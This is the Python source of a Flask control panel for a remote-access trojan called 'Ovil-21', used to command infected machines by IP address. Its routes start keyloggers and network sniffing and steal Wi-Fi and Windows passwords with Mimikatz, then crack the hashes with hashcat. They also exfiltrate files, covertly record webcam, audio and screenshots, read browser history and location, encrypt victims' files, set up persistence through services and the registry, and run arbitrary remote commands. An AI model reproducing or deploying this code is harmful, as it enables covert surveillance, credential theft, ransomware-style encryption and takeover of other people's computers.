import ipaddress
from hashcat.runp import runp
from multiprocessing import freeze_support
from spying import Spy
from spying.multyproc import Process
import os
import subprocess
import threading
import webbrowser

import moviepy.editor as movpy
from pydub import AudioSegment
import ffmpeg
# from turbo_flask import Turbo
import pathlib
from typing import Callable, List, Tuple
from pathlib import Path
from flask import Flask, render_template, send_file, request, abort, redirect, url_for, jsonify
import time
from network.consts import Massages, UPLOAD_DEFAULT_PATH, MITM_DEFAULT_PORT
from consts import *
from network import check_ip
from network.client import Client
from spying.consts import DEFAULT_AUDIO_NAME, DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_VIDEO_NAME, DEFAULT_SCREENSHOT_NAME
from datetime import datetime


app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_DEFAULT_PATH
# turbo = Turbo(app)
# ovils: List[Client] = [Client("15.165.32.1"), Client("15.35.21.65"), Client("127.0.0.1"), Client("1.1.2.4"),
#                        Client("192.168.0.15"), Client("192.168.0.16"), Client("8.8.8.5")]
screenshot_taken: List[bool | str] = [False, False, ""] # first indicates whether screenshot command sent and second mean if it succeded and third is the error msg

ovils: List[Client] = []


def handle_errors(func: Callable[..., str]) -> Callable[..., str]:

    def inner(*args, **kwargs) -> str:
        try:
            return func(*args, **kwargs)
        except Exception as e:
            return str(e)

    inner.__name__ = func.__name__
    return inner


def handle_disconnection(func: Callable) -> Callable:
    def inner(ip, *arg, **kargs):
        if ip not in ovils:
            return "This ovil is disconnected! Connect and try again"
        if not ovils[ovils.index(ip)].connected:
            ovils.remove(ip)
            return "This ovil has disconnected! Connect and try again"
        return func(ip, *arg, **kargs)
    inner.__name__ = func.__name__
    return inner


def is_connected(ip: str) -> bool:
    return ip in ovils and ovils[ovils.index(ip)].connected


@app.route('/')
@handle_errors
def hello_world():
    return render_template("index.html", ovils=[ovil.ip for ovil in ovils if ovil.connected])

@app.route('/ovil/<ip>/connect/')
@handle_errors
def connect_without_param(ip: str) -> str:
    return connect(ip)


@app.route('/connect/', methods=["GET"])
@handle_errors
def connect_by_param() -> str:
    ip = request.args.get("ip_address")
    return connect(ip)


@handle_errors
def connect(ip: str) -> str:
    if not check_ip(ip):
        return "Invalid IP! try again..."
    global ovils
    # time.sleep(2)
    if ip in ovils:
        if ovils[ovils.index(ip)].connected:
            return "You've already connected to this ovil"
        ovils.remove(ip)
    ovil = Client(ip)
    try:
        ovil.connect_to_server()
    except TimeoutError:
        return "This ovil didn't responded. You should try other ip"
    ovils.append(ovil)
    return "Connected successfully!"


@app.route("/ovil/<ip>/")
@handle_errors
def ovil(ip) -> str:
    """shows one ovil"""
    connected = is_connected(ip)
    return render_template("ovil.html", ip=ip, connected=connected)


@app.route("/ovil/<ip>/disconnect")
@handle_errors
def disconnect(ip):
    if ip not in ovils:
        return "Can't disconnect from a disconnected ovil..."
    i = ovils.index(ip)
    ovil = ovils[i]
    ovil.disconnect()
    ovils.remove(ip)
    return "Disconnected successfully!"


@app.route("/ovil/<ip>/staticmitm/")
@handle_errors
def staticmitm(ip):
    started = is_mitm_runs(ip)
    if type(started) == str:
        return render_template("big_massage.html", ip=ip, msg=started, tab="Static MITM")
    return render_template("staticmitm.html", started=started)


@app.route("/ovil/<ip>/staticmitm/start/", methods=["GET"])
@handle_errors
def start_staticmitm(ip):
    name = request.args.get("name")
    if ip not in ovils:
        return "This ovil is not connected"
    started = is_mitm_runs(ip)
    if type(started) == str:
        return started
    if started:
        return "could not start MITM because it has already started"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("start_sniffing_to_file", [name])
    if result == Massages.OK.value:
        ovil.mitm_filename = name
        return "MITM started successfully"
    elif result == Massages.NOT_OK.value:
        return "could not start MITM for unknown reason"
    return result


@app.route("/ovil/<ip>/staticmitm/stop/", methods=["GET"])
@handle_errors
def stop_staticmitm(ip):
    started = is_mitm_runs(ip)
    if type(started) == str:
        return started
    if not started:
        return "could not stop MITM because it has already stopped"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("stop_sniffing", [])
    if result == Massages.OK.value:
        msg = "MITM started successfully "
        succ, filename = get_file(ovil, ovil.mitm_filename)
        if succ:
            msg += f"and saved as {filename}"
        else:
            msg += f"but coudln't get the file info because {filename}"
        return msg
    elif result == Massages.NOT_OK.value:
        return "could not start MITM for unknown reason"
    return result


@handle_errors
@handle_disconnection
def is_mitm_runs(ip):
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("is_mitm_runs", [])
    return semi_msg_to_bool(result)


@app.route("/ovil/<ip>/dynamicmitm/")
@handle_errors
def dynamicmitm(ip):
    connected = is_mitm_runs(ip)
    if type(connected) == str:
        return render_template("big_massage.html", ip=ip, msg=connected, tab="Dynamic MITM")
    if not connected:
        result = start_dynamicmitm(ip)
        if type(result) == str:
            return render_template("big_massage.html", ip=ip, msg=result, tab="Dynamic MITM")

    connected = is_mitm_runs(ip)
    if type(connected) == str:
        return render_template("big_massage.html", ip=ip, msg=connected, tab="Dynamic MITM")
    if not connected:
        return render_template("big_massage.html", ip=ip, msg="Couldn't start MITM", tab="Dynamic MITM")
    i = ovils.index(ip)
    ovil = ovils[i]
    return render_template("dynamicmitm.html", data="\n".join(ovil.mitm_info), connected=True)


@app.route("/ovil/<ip>/dynamicmitm/stop")
@handle_errors
@handle_disconnection
def stop_dynamic_mitm(ip):
    connected = is_mitm_runs(ip)
    if type(connected) == str:
        return connected
    if not connected:
        return "Can't stop a stopped MITM"
    ovil = ovils[ovils.index(ip)]
    result = ovil.send_command("stop_sniffing", [])
    if msg_to_bool(result):
        return "Stopped Successfully"
    if semi_msg_to_bool(result):
        return result
    return "Couldn't stop!!"


def start_dynamicmitm(ip) -> str | bool:
    if ipaddress.IPv4Address(ip) not in ipaddress.IPv4Network('192.168.0.0/24'):
        Spy.open_port(MITM_DEFAULT_PORT)
    if ip not in ovils:
        return "Can't start KeyLogger on a disconnected ovil"
    i = ovils.index(ip)
    ovil = ovils[i]
    result: str = ovil.send_command("start_sniffing_on_net", [])
    if result == Massages.OK.value:
        return True
    elif result == Massages.NOT_OK.value:
        return "Unknown error!"
    return result


#
# @app.route('/hello/<user>')
# @handle_errors
# def hello_name(user):
#     return render_template('hello.html', name=user)
#
#
# @app.context_processor
# @handle_errors
# def inject_load():
#     return {"data": dynamic_mitm_ovil.mitm_info}
#
#
#
# def update_load():
#     while app.app_context():
#         if not dynamic_mitm_ovil:
#             continue
#         turbo.push(turbo.replace(render_template("dynamicmitm.html"), "load"))
#
#
# @app.before_first_request
# def before_first_request():
#     threading.Thread(target=update_load).start()

# @app.route("/dy")
# def dy():
#     return render_template("dynamicmitm.html", data=["hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", ])


@app.route("/ovil/<ip>/KeyLogger/")
@handle_errors
def keyLogger(ip):
    result = start_keyLogger(ip)
    if isinstance(result, str):
        return render_template("big_massage.html", ip=ip, msg=result, tab="keyLogger")
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("get_keyLogger", [])
    # result = "ff, gfgg, fdk, idfn, "*1000
    return render_template("keyLogger.html", connected=True, data=result)


def start_keyLogger(ip: str) -> str | bool:
    if ip not in ovils:
        return "Can't start KeyLogger on a disconnected ovil"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("start_keylogger", [])
    return semi_msg_to_bool(result)


@app.route("/ovil/<ip>/KeyLogger/stop")
@handle_errors
def stop_keyLogger(ip):
    if ip not in ovils:
        return "Can't stop KeyLogger on a disconnected ovil"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("stop_keylogger", [])
    if result == Massages.OK.value:
        return "The KeyLogger stopped successfully!"
    elif result == Massages.NOT_OK.value:
        return "Couldn't stop the KeyLogger!"
    return result


@app.route(r"/ovil/<ip>/steal_passwords/crack/")
@handle_errors
def crack_page(ip):
    return render_template("big_massage.html", tab="cracking_passwords", msg=crack(ip))


@handle_errors
@handle_disconnection
def crack(ip):
    if Path("cracked.txt").exists():
        with open("cracked.txt", "r") as c:
            d = c.read()
            if d:
                return d
    ovil = ovils[ovils.index(ip)]
    pc = steal_pc(ovil)
    return crack_passwords(pc, None)


def crack_passwords(passwords: str, timeout: int | None = MAX_TIME_TO_WAIT_FOR_CRACKING_HASH) -> str:
    try:
        lines = passwords[passwords.index("============== SAM hive secrets =============="):passwords.index("============== SECURITY hive secrets ==============")].split("\n")
        hashes = []
        users = {}
        for line in lines:
            line = line.strip()
            if line.endswith(":::"):
                line = line[0:-3]
                line = line.split(":")
                hashes.append(line[-1])
                users[line[0]] = line[-1]
        with open("hashcat\\hash.txt", "w") as h:
            h.write("\n".join(hashes))
        with open("hashcat\\cracked.txt", "w") as c:
            c.write("")
        args = (["hashcat.exe", "-m", "1000", "-a3", "-o", "cracked.txt", "hash.txt"], "hashcat")

        p = Process(target=runp, args=args)
        p.start()
        p.join(timeout)
        msg = ""
        with open("hashcat\\cracked.txt", "r") as c:
            for line in c.readlines():
                line = line.strip()
                if ":" in line:
                    h, password = line.split(":")
                    msg += f"{users[h]}:{password}"
        if not msg:
            return "time ran out! this is a hard password. you can try wait for longer or give up..."
        return msg
    except Exception as e:
        return f"couldn't crack hash because {e}"



@app.route("/ovil/<ip>/steal_passwords/")
@handle_errors
def steal_passwords(ip):
    if ip not in ovils:
        return render_template("big_massage.html", ip=ip, msg="Can't steal passwords from a disconnected ovil", tab="Steal Passwords")
    ovil = ovils[ovils.index(ip)]
    wifi = steal_wifi(ovil)
    pc = steal_pc(ovil)
    return render_template("passwords.html", wifi=wifi, pc=pc + "\n\n")


@handle_errors
def steal_wifi(ovil):
    return ovil.send_command("steal_passwords", [])


@handle_errors
def steal_pc(ovil):
    return ovil.send_command("passwords_by_mimikatz", [])


@app.route("/ovil/<ip>/video_audio_record/")
@handle_errors
def video_audio_record(ip):
    if ip not in ovils:
        return render_template("big_massage.html", ip=ip, msg="This ovil is not connected", tab="Video and Audio")
    ovil = ovils[ovils.index(ip)]
    video_audio = msg_to_bool(ovil.send_command("is_video_audio_started", []))
    audio = msg_to_bool(ovil.send_command("is_audio_started", []))
    video = msg_to_bool(ovil.send_command("is_video_started", []))
    return render_template("video_audio.html", video_audio=video_audio, audio=audio, video=video)


@app.route("/ovil/<ip>/video_audio_record/VideoAudioStart")
@handle_errors
def start_video_audio(ip):
    return start_stop_command(ip, "start_video_audio_record", [])


@app.route("/ovil/<ip>/video_audio_record/VideoStart")
@handle_errors
def start_video(ip):
    return start_stop_command(ip, "start_video_record", [])


@app.route("/ovil/<ip>/video_audio_record/AudioStart")
@handle_errors
def start_audio(ip):
    return start_stop_command(ip, "start_audio_record", [])


@app.route("/ovil/<ip>/video_audio_record/VideoAudioStop")
@handle_errors
def stop_video_audio(ip):
    r = start_stop_command(ip, "stop_video_audio_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_VIDEO_AUDIO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"video_audio{generate_time_stamp()}.mkv"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"
    # return redirect(url_for("/ovil/<ip>/video_audio_record/"))


def generate_time_stamp(t: datetime = None):
    t = t if t else datetime.now()
    return t.strftime("%d.%m.%Y_%H;%M;%S")


@app.route("/ovil/<ip>/video_audio_record/VideoStop")
@handle_errors
def stop_video(ip):
    r = start_stop_command(ip, "stop_video_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_VIDEO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"video.{generate_time_stamp()}.avi"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"


@app.route("/ovil/<ip>/video_audio_record/AudioStop")
@handle_errors
@handle_disconnection
def stop_audio(ip):
    r = start_stop_command(ip, "stop_audio_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_AUDIO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"audio{generate_time_stamp()}.avi"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"


def get_file(ovil: Client, filename: str) -> Tuple[bool, str]:
    """
    returns a tuple of whether succeded and the filename if succeded or error massage
    """
    succ, msg = ovil.send_command("steal_file", [filename])
    if msg.startswith(":Error: "):
        msg = msg[8::]
    if succ.startswith(":Error: "):
        succ = succ[8::]
    if succ == Massages.OK.value:
        return True, msg
    elif succ == Massages.NOT_OK.value:
        return False, msg
    else:
        return False, succ


def start_stop_command(ip, command, params, method="Start"):
    if ip not in ovils:
        return "This ovil is not connected"
    ovil = ovils[ovils.index(ip)]
    msg = ovil.send_command(command, params)
    if msg == Massages.OK.value:
        return f"{method}ed successfully!"
    elif msg == Massages.NOT_OK.value:
        return f"Couldn't {method} probably because it had already {method}ed"
    return msg


def msg_to_bool(msg: str) -> bool | str:
    if msg == Massages.OK.value:
        return True
    elif msg == Massages.NOT_OK.value:
        return False
    return False


def semi_msg_to_bool(msg: str) -> bool | str:
    if msg == Massages.OK.value:
        return True
    elif msg == Massages.NOT_OK.value:
        return False
    return msg


def find_last_file(path: str, suffix: str = "", prefix: str = "") -> str:
    lst = list(filter(lambda p: str(p.name).endswith(suffix) and str(p.name).startswith(prefix), sorted(Path(path).iterdir(), key=os.path.getmtime)))
    return str(lst[-1]) if len(lst) > 0 else ""


@app.route("/ovil/<ip>/video_audio_record/view_video_audio")
@handle_errors
def view_video_audio(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="video_audio")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Video and Audio")
    path = Path(path)
    if path.name.endswith(".mkv"):
        path = convert_to_mp4(path)
    return render_template("show_video.html", tab="Video and Audio", type="mp4", filename=path.name, title="Video and Audio")


@app.route("/ovil/<ip>/video_audio_record/view_video")
@handle_errors
def view_video(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="video.")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Video")
    path = Path(path)
    if path.name.endswith(".avi"):
        path = convert_to_mp4(path)
    return render_template("show_video.html", tab="Video and Audio", type="mp4", filename=path.name, title="Video")


@app.route("/ovil/<ip>/video_audio_record/view_audio")
@handle_errors
def view_audio(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="audio")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Audio")
    path = Path(path)
    if path.name.endswith(".wav"):
        path = convert_to_mp3(path)
    return render_template("show_audio.html", tab="Video and Audio", type="mp4", filename=path.name, title="Audio")


def convert_to_mp4(mkv_file: Path) -> Path:
    no_extension = ".".join(str(mkv_file).split(".")[:-1])
    with_mp4 = no_extension + ".mp4"

    clip = movpy.VideoFileClip(str(mkv_file))  # Reading .mkv file
    clip.write_videofile(with_mp4, codec="libx264", audio_codec="aac")

    os.remove(mkv_file)
    return Path(with_mp4)


def convert_to_mp3(wav_file: Path) -> Path:
    no_extension = ".".join(str(wav_file).split(".")[:-1])
    with_mp3 = no_extension + ".mp3"

    audio = AudioSegment.from_wav(wav_file)
    audio.export(with_mp3, format="mp3")
    os.remove(wav_file)

    return Path(with_mp3)


@app.route("/ovil/<ip>/encryption/")
@handle_errors
def encryption(ip):
    return render_template("encryption.html")


@app.route("/ovil/<ip>/encryption/GenerateKey/")
@handle_errors
@handle_disconnection
def generate_key(ip):
    ovil = ovils[ovils.index(ip)]
    key = ovil.send_command("generate_key", [])
    return key


def failed_succ_to_msg(result: str, method: str, key: str) -> str:
    try:
        lists = result.replace("\\\\", "\\")[2:-2].split("], [")
        succ, failed = lists[0].split(", "), lists[1].split(", ")
    except (IndexError, ValueError):
        return result
    msg = f"{method}ion with the key - '{key}': \n\n"
    msg += f"\tsucceeded to {method}: \n"
    for file in succ:
        file = file.strip()
        if file:
            msg += f"\t\t{file} \n"
    msg += "\n"
    msg += f"\tfailed to {method}: \n"
    for file in failed:
        file = file.strip()
        if file:
            msg += f"\t\t{file} \n"
    msg += "\n\n"
    return msg


@app.route("/ovil/<ip>/encryption/encrypt/")
@handle_errors
@handle_disconnection
def encrypt(ip):
    key = request.args.get("key")
    path = request.args.get("path")
    ovil = ovils[ovils.index(ip)]
    if not key or key == "default":
        key = ovil.send_command("encryption_key", [])
    if not path:
        return "Invalid path"
    result = ovil.send_command("encrypt", [path, key])
    return failed_succ_to_msg(result, 'encrypt', key)


@app.route("/ovil/<ip>/encryption/decrypt/")
@handle_errors
@handle_disconnection
def decrypt(ip):
    key = request.args.get("key")
    path = request.args.get("path")
    ovil = ovils[ovils.index(ip)]
    if key == "default":
        key = ovil.send_command("encryption_key", [])
    result = ovil.send_command("decrypt", [path, key])
    if not path:
        return "Invalid path"
    return failed_succ_to_msg(result, "decrypt", key)


@app.route("/ovil/<ip>/<page>/files/")
@handle_errors
@handle_disconnection
def show_files(ip, page):
    path = request.args.get("path")
    ovil = ovils[ovils.index(ip)]
    result = ovil.send_command("show_files", [path])
    return result.replace(",", "\n")


@app.route("/ovil/<ip>/services/")
@handle_errors
def services(ip):
    params = {}
    result = start_services(ip)
    if isinstance(result, str):
        params["service"] = False
        params["data"] = result
    else:
        params["service"], params["data"] = result
    return render_template("servicesStartup.html", **params)


@handle_errors
@handle_disconnection
def start_services(ip) -> Tuple[bool, str] | str:
    ovil = ovils[ovils.index(ip)]
    service = ovil.send_command("is_started", [])
    if msg_to_bool(service):
        return True, "Services are running!"
    else:
        start = ovil.send_command("install_service", [])
        if msg_to_bool(start):
            return True, "Services started successfully!"
        elif semi_msg_to_bool(start):
            return False, start
        else:
            return False, "Unknown error"


@app.route("/ovil/<ip>/services/InsertStartup/")
@handle_errors
@handle_disconnection
def insert_to_startup(ip):
    ovil = ovils[ovils.index(ip)]
    return insert_to_startup_folder(ovil) + "\n" + insert_to_startup_registry(ovil)

@app.route("/ovil/<ip>/services/StopServices/")
@handle_errors
@handle_disconnection
def stop_services(ip):
    ovil = ovils[ovils.index(ip)]
    r = ovil.send_command("remove_services", [])
    if msg_to_bool(r):
        return "Stopped Successfully!"
    else:
        return r


@handle_errors
@handle_disconnection
def insert_to_startup_folder(ovil: Client):
    startup_folder = ovil.send_command("add_to_startup_folder", [])
    if msg_to_bool(startup_folder):
        return "Added to startup folder successfully"
    elif semi_msg_to_bool(startup_folder):
        return f"Startup folder: {startup_folder}"
    else:
        return f"Startup folder: unknown error"


@handle_errors
@handle_disconnection
def insert_to_startup_registry(ovil: Client):
    startup_registry = ovil.send_command("add_to_registry_startup", [])
    if msg_to_bool(startup_registry):
        return "Added to startup registry successfully"
    elif semi_msg_to_bool(startup_registry):
        return f"Startup registry: {startup_registry}"
    else:
        return f"Startup registry: unknown error"


@app.route("/ovil/<ip>/services/RemoveStartup/")
@handle_errors
@handle_disconnection
def remove_from_startup(ip):
    ovil = ovils[ovils.index(ip)]
    return remove_from_startup_folder(ovil) + "\n" + remove_from_startup_registry(ovil)


@handle_errors
@handle_disconnection
def remove_from_startup_folder(ovil: Client):
    startup_folder = ovil.send_command("remove_from_startup_folder", [])
    if msg_to_bool(startup_folder):
        return "Removed from startup folder successfully"
    elif semi_msg_to_bool(startup_folder):
        return f"Startup folder: {startup_folder}"
    else:
        return f"Startup folder: unknown error"


@handle_errors
@handle_disconnection
def remove_from_startup_registry(ovil: Client):
    startup_registry = ovil.send_command("remove_from_startup_registry", [])
    if msg_to_bool(startup_registry):
        return "Removed from startup registry successfully"
    elif semi_msg_to_bool(startup_registry):
        return f"Startup registry: {startup_registry}"
    else:
        return f"Startup registry: unknown error"


@app.route("/ovil/<ip>/steal_file/")
@handle_errors
def steal_files_page(ip):
    return render_template("steal_files.html")


@app.route("/ovil/<ip>/steal_file/steal/")
@handle_errors
@handle_disconnection
def steal_file(ip):
    path = request.args.get("path")
    ovil = ovils[ovils.index(ip)]
    status, filename = get_file(ovil, path)
    if status:
        return f"the file '{path}' was stolen successfully and was saved in '{filename}'"
    else:
        error_msg = filename
        if error_msg == Massages.NOT_OK.value:
            return "Unknown error"
        return error_msg


@app.route("/ovil/<ip>/other_info/")
@handle_errors
def other_info(ip):
    params = {}
    if screenshot_taken[0]:
        if screenshot_taken[1]:
            path = Path("uploads") / Path(find_last_file(UPLOAD_DEFAULT_PATH, prefix="screenshot")).name
            path = "/" + str(path).replace("\\", "/")
            screenshot_taken[0], screenshot_taken[1] = False, False
            params["screenshot"] = True
            params["path"] = path
        else:
            screenshot_taken[0], screenshot_taken[1] = False, False
            params["screenshot"] = True
            params["msg"] = screenshot_taken[2]
    history = get_history(ip)
    if isinstance(history, list):
        params["history"] = True
        params["history_data"] = history
    elif isinstance(history, str):
        params["history"] = False
        params["history_error"] = history
    else:
        params["history"] = False
        params["history_error"] = "Unknown Error"
    return render_template("other_info.html", **params)


@handle_errors
@handle_disconnection
def get_history(ip):
    ovil = ovils[ovils.index(ip)]
    result = ovil.send_command("get_browser_info_str", [])
    try:
        ls = result.split("\n")
        ls2 = []
        for info in ls:
            if not info:
                continue
            date, site = info.split(", ")
            site = site.split('?')[0]
            ls2.append((date, site))
    except (ValueError, IndexError, TypeError):
        return result
    final_ls = []
    for i in range(len(ls2)):
        date, site = ls2[i]
        if i % 2 == 0:
            final_ls.append([date, site, None, None])
        else:
            final_ls[-1][2], final_ls[-1][3] = date, site
    return final_ls


@app.route("/ovil/<ip>/other_info/screenshot/")
@handle_errors
def screenshot(ip):
    screenshot_taken[0] = True
    screenshot_taken[1] = False
    screenshot_taken[2] = take_screenshot(ip)
    return redirect(url_for(f"other_info", ip=ip))


@handle_errors
@handle_disconnection
def take_screenshot(ip) -> str:
    ovil = ovils[ovils.index(ip)]
    result = ovil.send_command("take_screenshot", [])
    if not msg_to_bool(result):
        if semi_msg_to_bool(result):
            return result
        return "Unknown Error"
    screenshot_taken[1], msg = get_file(ovil, DEFAULT_SCREENSHOT_NAME)
    return msg


@app.route("/ovil/<ip>/other_info/FindLocation/")
@handle_errors
@handle_disconnection
def find_location(ip):
    ovil = ovils[ovils.index(ip)]
    return ovil.send_command("get_location", [])


@app.route("/ovil/<ip>/other_info/GetComputer/")
@handle_errors
@handle_disconnection
def get_computer(ip):
    ovil = ovils[ovils.index(ip)]
    return ovil.send_command("get_computer", [])


@app.route("/ovil/<ip>/other_info/GetUser/")
@handle_errors
@handle_disconnection
def get_user(ip):
    ovil = ovils[ovils.index(ip)]
    return ovil.send_command("get_user", [])


@app.route("/ovil/<ip>/RemoteControl/")
@handle_errors
def remote_control(ip):
    return render_template("RemoteControll.html", ip=ip)


@app.route("/ovil/<ip>/RemoteControl/run/", methods=['POST'])
@handle_errors
def run(ip):
    help = "Hi! welcome to Ovil-21's remote control. \n " \
           "There are only three Types commands here: \n" \
           "    'run' - runs a cmd command. \n" \
           "    'run-ovil' - runs a ovil-21 command. \n" \
           "    'connect/disconnect' - you can understand from the name... \n"
    data = request.get_json()
    command = data["method"]
    params = data["params"]
    result = {}
    if command == "help" or command == "?":
        return help
    if command == "connect":
        return connect(ip)
    if command == "disconnect":
        return disconnect(ip)
    if ip not in ovils:
        return "This ovil is disconnected! Connect and try again"
    ovil = ovils[ovils.index(ip)]
    if command == "run-ovil" and len(params) > 0:
        return str(ovil.send_command(params[0], params[1::]))
    if command == "run" and len(params) > 0:
        return ovil.send_command("run", params)
    return "Invalid Command! try 'help'"


def main():
    try:
        webbrowser.open_new(r"http://127.0.0.1:"+str(DEFAULT_PORT))
        app.run(debug=False, port=DEFAULT_PORT)
    finally:
        for ovil in ovils:
            ovil.disconnect()


if __name__ == '__main__':
    freeze_support()
    main()
